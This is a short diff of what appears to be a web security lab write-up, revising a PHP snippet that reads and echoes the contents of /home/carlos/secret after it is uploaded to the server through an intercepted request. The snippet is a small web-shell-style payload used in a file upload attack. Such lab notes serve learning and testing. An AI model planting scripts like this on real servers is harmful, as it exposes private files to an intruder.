@@ -143,8 +143,8 @@ to
 ```php
 <?php
     $flag_path='/home/carlos/secret';
-	$instance=file_get_contents('/home/carlos/secret');
-    echo $instance;
+	$content=file_get_contents($flag_path);
+    echo $content;
 ?>
 ```
 - Forwarded the request again and the code was uploaded on the server.
